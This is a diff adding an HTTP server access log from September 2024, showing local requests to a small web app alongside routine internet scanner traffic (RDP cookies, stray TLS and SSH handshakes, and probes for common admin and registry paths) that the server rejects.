+127.0.0.1 - - [20/Sep/2024 10:11:09] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 10:11:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 10:14:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 10:14:10] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 10:14:16] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 10:14:16] "GET /security_check/123/123 HTTP/1.1" 200 -
+185.234.216.112 - - [20/Sep/2024 10:47:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [20/Sep/2024 10:47:07] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+79.124.56.186 - - [20/Sep/2024 11:09:03] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [20/Sep/2024 11:09:03] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [20/Sep/2024 12:49:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 13:46:09] "GET / HTTP/1.1" 200 -
+178.159.37.98 - - [20/Sep/2024 14:13:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [20/Sep/2024 14:13:25] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [20/Sep/2024 14:16:32] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 14:16:33] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 14:16:39] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 14:16:39] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 14:19:14] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 14:19:14] "GET /favicon.ico HTTP/1.1" 404 -
+206.189.23.144 - - [20/Sep/2024 14:56:34] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03~B\x92½ò-')
+206.189.23.144 - - [20/Sep/2024 14:56:34] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03~B\x92½ò- úHÔÏi\x15ùóKyÎWjSÞ:\x06í×[#%d\x1b`\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [20/Sep/2024 15:00:19] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [20/Sep/2024 15:09:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [20/Sep/2024 15:09:58] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+65.49.20.67 - - [20/Sep/2024 16:31:17] "GET / HTTP/1.1" 200 -
+65.49.20.67 - - [20/Sep/2024 16:31:25] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 16:54:30] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 16:54:31] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 16:55:28] "GET /ui/chat/a8626fa5099b74f5 HTTP/1.1" 404 -
+79.124.49.202 - - [20/Sep/2024 17:37:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [20/Sep/2024 17:37:02] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+101.251.238.166 - - [20/Sep/2024 21:02:40] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x87\x86\x1a\x93÷»')
+101.251.238.166 - - [20/Sep/2024 21:02:40] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x87\x86\x1a\x93÷»" HTTPStatus.BAD_REQUEST -
+101.251.238.166 - - [20/Sep/2024 21:04:33] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x9e\x8b6\x14\x15UTÁ¦·%Z'¸¥0ê»9")
+101.251.238.166 - - [20/Sep/2024 21:04:33] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x9e\x8b6\x14\x15UTÁ¦·%Z'¸¥0ê»9" HTTPStatus.BAD_REQUEST -
+101.251.238.166 - - [20/Sep/2024 21:05:34] "GET / HTTP/1.1" 200 -
+101.251.238.166 - - [20/Sep/2024 21:07:12] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 23:13:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 23:17:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 23:17:10] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 23:17:10] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 23:17:34] "GET / HTTP/1.1" 200 -
+79.124.49.202 - - [21/Sep/2024 00:19:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [21/Sep/2024 00:19:35] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+161.189.42.18 - - [21/Sep/2024 01:49:16] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
+161.189.42.18 - - [21/Sep/2024 01:49:16] "~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~" HTTPStatus.BAD_REQUEST -
+79.124.49.202 - - [21/Sep/2024 03:36:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [21/Sep/2024 03:36:59] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+79.110.62.129 - - [21/Sep/2024 04:22:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.110.62.129 - - [21/Sep/2024 04:22:47] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+205.210.31.89 - - [21/Sep/2024 08:13:18] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Sep/2024 09:31:12] "GET / HTTP/1.1" 200 -
+44.220.188.16 - - [21/Sep/2024 09:48:49] code 400, message Bad request version ("\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+44.220.188.16 - - [21/Sep/2024 09:48:49] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x12\x91v\x11ÐUÇ\x9d\x01>ó`Ï\x84.\x09sf\x06ÌÀ¤øÛ\x95æ\x98èË¤5\x96 \x96\x1a=}\x86þíï\x1f\x1frj\x98íg\x99dY9[s®ùð\x1cdÏèoDq\x0b\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À" HTTPStatus.BAD_REQUEST -
+44.220.188.16 - - [21/Sep/2024 09:48:50] "GET / HTTP/1.1" 200 -
+167.94.146.48 - - [21/Sep/2024 11:32:14] code 400, message Bad request version ('À\x14À')
+167.94.146.48 - - [21/Sep/2024 11:32:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03]¯)m]èsâ\x0eu9À\x8cØ,×ÅÊRci*j}g7Ýâw\x04Ó| 75!\x1bR©W4Ð\x18¡Ø=@Ü!Z\x85§\x09b\x14òÔ!PDÝuj\x1aÛ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.146.48 - - [21/Sep/2024 11:32:18] "GET / HTTP/1.1" 200 -
+167.94.146.48 - - [21/Sep/2024 11:32:23] "GET / HTTP/1.1" 200 -
+167.94.146.48 - - [21/Sep/2024 11:32:23] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.48 - - [21/Sep/2024 11:32:24] code 505, message Invalid HTTP version (2.0)
+167.94.146.48 - - [21/Sep/2024 11:32:24] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+45.84.89.3 - - [21/Sep/2024 11:48:03] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.3 - - [21/Sep/2024 11:48:03] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+138.68.155.239 - - [21/Sep/2024 12:08:46] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+138.68.155.239 - - [21/Sep/2024 12:08:46] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+167.94.138.45 - - [21/Sep/2024 12:38:12] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03³¹\x95')
+167.94.138.45 - - [21/Sep/2024 12:38:12] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03³¹\x95\x1f\x95ùuoL" HTTPStatus.BAD_REQUEST -
+167.94.138.45 - - [21/Sep/2024 12:38:17] "GET / HTTP/1.1" 200 -
+167.94.138.45 - - [21/Sep/2024 12:38:26] "GET / HTTP/1.1" 200 -
+167.94.138.45 - - [21/Sep/2024 12:38:27] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.45 - - [21/Sep/2024 12:38:33] code 505, message Invalid HTTP version (2.0)
+167.94.138.45 - - [21/Sep/2024 12:38:33] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+185.234.216.112 - - [21/Sep/2024 12:54:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [21/Sep/2024 12:54:13] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [21/Sep/2024 12:54:14] "GET / HTTP/1.1" 200 -
+198.235.24.45 - - [21/Sep/2024 14:12:25] "GET / HTTP/1.1" 200 -
+198.235.24.31 - - [21/Sep/2024 14:51:41] "GET / HTTP/1.1" 200 -
+61.138.228.132 - - [21/Sep/2024 14:52:45] "GET / HTTP/1.0" 200 -
+61.138.228.132 - - [21/Sep/2024 14:52:51] "HEAD / HTTP/1.1" 200 -
+61.138.228.132 - - [21/Sep/2024 14:53:01] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03')
+61.138.228.132 - - [21/Sep/2024 14:53:01] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03" HTTPStatus.BAD_REQUEST -
+61.138.228.132 - - [21/Sep/2024 14:53:01] code 400, message Bad request version ('\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+61.138.228.132 - - [21/Sep/2024 14:53:01] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03)È\x17k\x0fëp@Ä5æ*\x98¤\x8b\x06Ø ÆËpi*Rs\x96G\x04À\x83\x90\x1d\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" HTTPStatus.BAD_REQUEST -
+178.159.37.98 - - [21/Sep/2024 15:08:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [21/Sep/2024 15:08:05] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [21/Sep/2024 15:21:28] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [21/Sep/2024 15:21:29] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 16:43:28] "GET / HTTP/1.1" 200 -
+138.68.183.142 - - [21/Sep/2024 17:40:13] code 400, message Bad request version ('j\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+138.68.183.142 - - [21/Sep/2024 17:40:13] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03FO\x15\x12!Ff7\x02\x0c~VVÛ\x01¤\x1a±^\x98ç\x19-\x08[\x87>\x1c¶Y\x0cj\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+148.153.45.238 - - [21/Sep/2024 17:51:19] "GET /aRaH HTTP/1.1" 404 -
+148.153.45.238 - - [21/Sep/2024 17:51:19] "GET /aXCa HTTP/1.1" 404 -
+148.153.45.238 - - [21/Sep/2024 17:51:19] "GET /aab8 HTTP/1.1" 404 -
+148.153.45.238 - - [21/Sep/2024 17:51:20] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 -
+148.153.45.238 - - [21/Sep/2024 17:51:20] "GET /aab9 HTTP/1.1" 404 -
+148.153.45.238 - - [21/Sep/2024 17:51:20] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 -
+83.222.190.78 - - [21/Sep/2024 18:17:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [21/Sep/2024 18:17:40] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+111.7.96.151 - - [21/Sep/2024 19:39:29] code 400, message Bad request version ('À\x13À')
+111.7.96.151 - - [21/Sep/2024 19:39:29] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03I\x06²ù¼\x99iÀYûøºe-\x83Ud]\x0e\x8d·b8´gÆÝ9dZ8f gÁ\x81i³öòË°©\x19NÖ½\x95g|püé<Z¡\x90T·é¥8'O;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+111.7.96.151 - - [21/Sep/2024 19:39:39] "GET / HTTP/1.1" 200 -
+36.41.67.60 - - [21/Sep/2024 19:41:18] "GET / HTTP/1.1" 200 -
+36.41.67.60 - - [21/Sep/2024 19:41:19] "GET / HTTP/1.1" 200 -
+36.41.67.60 - - [21/Sep/2024 19:41:21] "GET /favicon.ico HTTP/1.1" 404 -
+113.141.84.90 - - [21/Sep/2024 19:41:54] "GET / HTTP/1.1" 200 -
+113.141.84.90 - - [21/Sep/2024 19:42:01] "GET / HTTP/1.1" 200 -
+113.141.84.90 - - [21/Sep/2024 19:42:07] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [21/Sep/2024 19:48:10] "GET / HTTP/1.1" 200 -
+80.94.95.39 - - [21/Sep/2024 20:02:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+80.94.95.39 - - [21/Sep/2024 20:02:31] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+184.105.139.69 - - [21/Sep/2024 20:34:00] "GET / HTTP/1.1" 200 -
+184.105.139.69 - - [21/Sep/2024 20:34:09] "GET /favicon.ico HTTP/1.1" 404 -
+80.94.95.39 - - [21/Sep/2024 21:00:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+80.94.95.39 - - [21/Sep/2024 21:00:40] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [21/Sep/2024 21:08:46] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:08:46] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [21/Sep/2024 21:08:52] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:08:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:11:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:11:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [21/Sep/2024 21:11:27] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:11:27] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:14:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:14:58] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [21/Sep/2024 21:15:04] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:15:04] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:15:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [21/Sep/2024 21:36:11] "GET / HTTP/1.1" 200 -
+134.209.242.164 - - [21/Sep/2024 23:39:56] "GET / HTTP/1.0" 200 -
+161.35.70.41 - - [21/Sep/2024 23:39:57] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 -
+161.35.208.212 - - [21/Sep/2024 23:39:57] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+161.35.77.208 - - [21/Sep/2024 23:39:57] code 400, message Bad request version ('À\x13À')
+161.35.77.208 - - [21/Sep/2024 23:39:57] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²ÜÍH­X2\x9bî&öq@\x8e»<êt\x95¹\x97\\\x18K°\x89¾K:çXÓ XW¡\x87\x01´\x1b\x1aºmgõf`¹¢Ô\x10«H+tU\x18¸\x10Ü\x8e÷{äö\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+68.183.78.62 - - [21/Sep/2024 23:39:57] "GET /v2/_catalog HTTP/1.1" 404 -
+68.183.78.62 - - [21/Sep/2024 23:39:57] "GET / HTTP/1.1" 200 -
+161.35.77.208 - - [21/Sep/2024 23:39:57] code 400, message Bad request version ('À\x13À')
+161.35.77.208 - - [21/Sep/2024 23:39:57] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¯\x06P\x97Aòtt\x1aù~\x99T\x157\x05&\x15¹m+\x01\x90\x8e:¤<\x7f\x07ë¶\x92 \x99\x01&\x92»öeê\x9aGäñ\x87ú]èÓtùTG`%\x82\x10¬a\x18ý \x99\x94\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+161.35.77.208 - - [21/Sep/2024 23:39:58] code 400, message Bad request version ('Ñ')
+161.35.77.208 - - [21/Sep/2024 23:39:58] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03]þúgaÆPOXñ¤@\x18\x0eÔ\x9cÄ\x16øá¼WÝ¨èÇÂñR1\x18ª \x9eÔvâb\x8fÎ² Ñ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [22/Sep/2024 00:23:14] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 00:23:15] "GET / HTTP/1.1" 200 -
+206.168.34.33 - - [22/Sep/2024 01:07:11] code 400, message Bad request version ('À\x14À')
+206.168.34.33 - - [22/Sep/2024 01:07:11] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0e|u\x11\x10rso¨ÑXÂ\x83µ\x8d\x97][\x09Ð\x1dh/¯\x91D\x07\x1f//\x7f\x16 -\x90{`¹Ä\x8dIªFw\x0e±z7\x16£\x0e·§\x02\x84ßÅuÉ\x8a\x98\x89\x98Y$\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.34.33 - - [22/Sep/2024 01:07:15] "GET / HTTP/1.1" 200 -
+206.168.34.33 - - [22/Sep/2024 01:07:19] "GET / HTTP/1.1" 200 -
+206.168.34.33 - - [22/Sep/2024 01:07:20] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.33 - - [22/Sep/2024 01:07:21] code 505, message Invalid HTTP version (2.0)
+206.168.34.33 - - [22/Sep/2024 01:07:21] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+68.183.78.62 - - [22/Sep/2024 02:13:35] code 400, message Bad request version ("ÌðÚª\x8e\x93\x90\x8d\x97ÛÕ\x9a\x93§þ\x88Tå#ÂGâYr[Ö¶F\x8a\x8f@\x14\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+68.183.78.62 - - [22/Sep/2024 02:13:35] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\\°O\x87fg\x1a]H\x96\x17\x02ñsÌÿ\x0cMè"X\x9aa\x0768PÚEøLp ÌðÚª\x8e\x93\x90\x8d\x97ÛÕ\x9a\x93§þ\x88Tå#ÂGâYr[Ö¶F\x8a\x8f@\x14\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [22/Sep/2024 02:29:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 09:57:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 10:05:17] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [22/Sep/2024 10:12:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [22/Sep/2024 10:12:49] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+142.93.39.72 - - [22/Sep/2024 12:32:28] code 400, message Bad request version ('\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+142.93.39.72 - - [22/Sep/2024 12:32:28] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03!i0:¤_1ü\x15\x93ê\x8f\x89i¡\x10Ì\x1eó¥\x83ýJ\x1då\x11àù%2`\x0c\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+205.210.31.208 - - [22/Sep/2024 12:42:12] "GET / HTTP/1.0" 200 -
+185.234.216.112 - - [22/Sep/2024 12:54:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [22/Sep/2024 12:54:39] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+64.62.197.201 - - [22/Sep/2024 13:11:17] "GET / HTTP/1.1" 200 -
+64.62.197.200 - - [22/Sep/2024 13:11:31] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 13:34:14] "GET / HTTP/1.1" 200 -
+79.124.56.186 - - [22/Sep/2024 13:55:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [22/Sep/2024 13:55:05] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+52.76.71.100 - - [22/Sep/2024 15:23:48] "GET /favicon.ico HTTP/1.1" 404 -
+147.185.132.12 - - [22/Sep/2024 15:39:27] "GET / HTTP/1.1" 200 -
+45.84.89.3 - - [22/Sep/2024 15:47:08] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [22/Sep/2024 16:05:56] "GET / HTTP/1.1" 200 -
+91.92.240.39 - - [22/Sep/2024 17:12:26] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+91.92.240.39 - - [22/Sep/2024 17:12:26] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+147.185.133.1 - - [22/Sep/2024 17:25:32] code 400, message Bad request version ('À\x13À')
+147.185.133.1 - - [22/Sep/2024 17:25:32] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ã¬\x1fo\x05§l\x8bWÏ\x9dB;Î¸*ãIÇn'6\x92´Ø\x1c\\É<C°{ (AG\x96Æof\x9aÍ4\x0fªÉ¥ªHOã¥Eb\x7fÊT\x8e7ºý)¤]®\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+147.185.133.1 - - [22/Sep/2024 17:25:33] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x89}ùæ¢\x19ráY\xad\x05êµ0A\x02|V\x1bcSÓ\xadI4Ðwøö,$¥\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+147.185.133.1 - - [22/Sep/2024 17:25:33] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x89}ùæ¢\x19ráY­\x05êµ0A\x02|V\x1bcSÓ­I4Ðwøö,$¥\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [22/Sep/2024 18:04:58] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:04:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:04:59] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:05:02] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:05:02] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:05:14] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:05:15] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:09:52] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:09:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:09:53] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:09:57] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:10:10] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:10:10] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:28:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:28:54] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:29:01] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:29:01] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:30:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:30:43] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:30:53] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:30:53] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:37:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:37:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:37:09] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:37:09] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:38:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:38:55] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [22/Sep/2024 18:39:06] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:39:06] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:39:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:39:29] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:39:29] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [22/Sep/2024 18:40:12] "GET / HTTP/1.1" 200 -
